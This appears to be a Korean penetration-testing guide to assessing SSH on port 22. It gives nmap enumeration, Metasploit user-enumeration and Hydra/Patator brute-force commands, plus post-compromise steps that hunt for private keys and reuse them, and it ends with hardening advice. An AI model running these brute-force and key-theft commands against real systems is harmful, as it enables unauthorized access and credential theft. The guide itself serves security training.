---
sidebar_position: 2
title: SSH (Port 22)
---

# SSH 취약점 진단 (포트 22)

## 개요

**SSH (Secure Shell)**: 암호화된 원격 접속 프로토콜

**인증 방식**:
1. 공개키/개인키 인증 (Key-based)
2. 비밀번호 인증 (Password-based)

**일반적인 SSH 서버**:
- OpenSSH
- Dropbear
- Tectia SSH

---

## 취약점 진단 체크리스트

### 1. 비밀번호 로그인 활성화 여부
비밀번호 인증이 가능하면 브루트포스 공격에 취약

### 2. 사용자 계정 열거
OpenSSH < 7.7 버전에서 유효한 사용자 이름 확인 가능

### 3. 약한 비밀번호 정책
- 짧은 비밀번호
- 일반적인 비밀번호
- 계정 잠금 정책 없음

### 4. 구버전 취약점
알려진 CVE가 존재하는 오래된 버전

---

## 정보 수집

### 서비스 버전 확인

```bash
# 기본 스캔
nmap -p 22 -sV <target>

# 스크립트 포함 스캔
nmap -p 22 -sV -sC <target>

# 예시
nmap -p 22 -sV -sC 192.168.1.10

# 출력 예시:
# 22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5
# | ssh-hostkey: 
# |   3072 d4:80:32:.. (RSA)
# | ssh-auth-methods: 
# |   Supported authentication methods:
# |     publickey
# |     password
```

### 비표준 포트 스캔

```bash
# SSH가 다른 포트에서 실행될 수 있음
nmap -p 2222,2200,22222 -sV <target>
```

### NSE 스크립트 활용

```bash
# 인증 방법 확인
nmap -p 22 --script ssh-auth-methods <target>

# 호스트 키 확인
nmap -p 22 --script ssh-hostkey <target>

# 알고리즘 확인
nmap -p 22 --script ssh2-enum-algos <target>

# 모든 SSH 스크립트
nmap -p 22 --script "ssh-*" <target>
```

### 수동 배너 확인

```bash
# Netcat으로 배너 확인
nc <target> 22

# 또는
telnet <target> 22

# SSH 상세 정보 확인
ssh -v <target>
```

---

## 취약점 진단

### 사용자 이름 열거 (OpenSSH < 7.7)

**Metasploit 사용**:

```bash
# Metasploit 실행
msfconsole

# SSH 유저 열거 모듈 검색
search ssh_enumusers

# 모듈 사용
use auxiliary/scanner/ssh/ssh_enumusers

# 옵션 확인
show options

# 대상 설정
set rhosts <target>
set rport 22

# 유저 이름 리스트 설정
set user_file /usr/share/seclists/Usernames/top-usernames-shortlist.txt

# 실행
run
```

**결과 예시**:
```
[+] 192.168.1.10:22 - SSH - User 'root' found
[+] 192.168.1.10:22 - SSH - User 'admin' found
[+] 192.168.1.10:22 - SSH - User 'user' found
```

### 브루트포스 공격

**Hydra 사용**:

```bash
# 단일 사용자
hydra -l <username> -P <wordlist> ssh://<target> -V -f

# 예시
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10 -V -f

# 다수 사용자
hydra -L users.txt -P passwords.txt ssh://<target> -V -f

# 포트 지정
hydra -l admin -P passwords.txt ssh://<target>:2222 -V -f
```

**플래그 설명**:
- `-l`: 단일 사용자
- `-L`: 사용자 리스트 파일
- `-p`: 단일 비밀번호
- `-P`: 비밀번호 리스트 파일
- `-V`: Verbose (진행 상황 표시)
- `-f`: 성공 시 중지
- `-t`: 동시 연결 수 (기본 16)

**Metasploit 사용**:

```bash
msfconsole

use auxiliary/scanner/ssh/ssh_login

set rhosts <target>
set username root
set pass_file /usr/share/wordlists/rockyou.txt

# 또는 사용자 리스트 사용
set user_file users.txt

run
```

### 약한 키 확인

```bash
# Debian 약한 키 확인
nmap -p 22 --script ssh-hostkey --script-args ssh_hostkey=full <target>
```

---

## 공개 취약점 검색

### Searchsploit

```bash
# 버전별 취약점 검색
searchsploit openssh <version>

# 예시
searchsploit openssh 7.4

# 출력:
# OpenSSH 7.4 - User Enumeration (CVE-2018-15473)
```

### 주요 SSH 취약점

**CVE-2018-15473**: OpenSSH < 7.7 사용자 열거
**CVE-2016-6210**: OpenSSH 타이밍 공격을 통한 사용자 열거
**CVE-2008-0166**: Debian OpenSSH 약한 키 생성

---

## 실전 팁

### RockYou 워드리스트 준비

```bash
# 압축 해제 (처음 사용 시)
sudo gzip -d /usr/share/wordlists/rockyou.txt.gz

# 파일 크기 확인
ls -lh /usr/share/wordlists/rockyou.txt
# 약 134MB, 14,344,391 단어
```

### 효율적인 워드리스트

```bash
# 짧은 리스트 (빠른 테스트)
/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt

# 중간 리스트
/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-10000.txt

# 전체 리스트 (시간 오래 걸림)
/usr/share/wordlists/rockyou.txt
```

### 브루트포스 주의사항

⚠️ **실무에서 주의할 점**:
1. **계정 잠금**: 여러 번 실패 시 계정 차단
2. **IDS/IPS 탐지**: 대량 로그인 시도 감지
3. **로그 기록**: 모든 시도가 로그에 남음
4. **대역폭**: 네트워크 부하 발생
5. **법적 문제**: 승인 범위 내에서만 수행

**권장 방법**:
- 패스워드 스프레이 사용 (한 계정당 1-2번만 시도)
- 사전 동의 확보
- 최소한의 시도로 제한

---

## SSH 키 파일 확인

공격 후 대상 시스템에 접근했을 때:

```bash
# SSH 개인키 찾기
find / -name "id_rsa" 2>/dev/null
find / -name "id_dsa" 2>/dev/null

# 사용자 홈 디렉토리 SSH 키
ls -la ~/.ssh/
ls -la /home/*/.ssh/

# 키 권한 확인
ls -la ~/.ssh/id_rsa
# -rw------- (600) 이어야 정상
```

**발견한 개인키 사용**:

```bash
# 개인키 복사
cat /home/user/.ssh/id_rsa

# 로컬에 저장
vim id_rsa
# (내용 붙여넣기)

# 권한 설정
chmod 600 id_rsa

# 키로 접속
ssh -i id_rsa user@<target>
```

---

## 설정 파일 분석

SSH 서버 설정 파일:

```bash
# SSH 설정 파일 위치
/etc/ssh/sshd_config

# 주요 설정 확인
cat /etc/ssh/sshd_config | grep -v "#"

# 비밀번호 인증 여부
PasswordAuthentication yes

# Root 로그인 허용 여부
PermitRootLogin yes

# 공개키 인증 여부
PubkeyAuthentication yes
```

---

## 자동화 도구

### SSHScan

```bash
# 설치
gem install ssh_scan

# 스캔
ssh_scan -t <target>

# 포트 지정
ssh_scan -t <target> -p 2222
```

### Patator

```bash
# SSH 브루트포스
patator ssh_login host=<target> user=<username> password=FILE0 0=passwords.txt -x ignore:mesg='Authentication failed'
```

---

## 주요 명령어 요약

```bash
# 서비스 스캔
nmap -p 22 -sV -sC <target>

# 인증 방법 확인
nmap -p 22 --script ssh-auth-methods <target>

# SSH 접속 테스트
ssh <user>@<target>
ssh -v <user>@<target>  # Verbose

# 사용자 열거 (Metasploit)
use auxiliary/scanner/ssh/ssh_enumusers
set rhosts <target>
set user_file users.txt
run

# 브루트포스 (Hydra)
hydra -l <user> -P <wordlist> ssh://<target> -V -f

# 개인키로 접속
ssh -i id_rsa <user>@<target>

# 취약점 검색
searchsploit openssh <version>
```

## 보안 권장사항

1. ✅ 비밀번호 인증 비활성화 (키 인증만 허용)
2. ✅ Root 로그인 금지
3. ✅ 강력한 비밀번호 정책
4. ✅ Fail2ban 등 브루트포스 방어 도구 사용
5. ✅ 기본 포트(22) 변경
6. ✅ 최신 버전으로 업데이트
7. ✅ 특정 IP만 접근 허용 (방화벽)
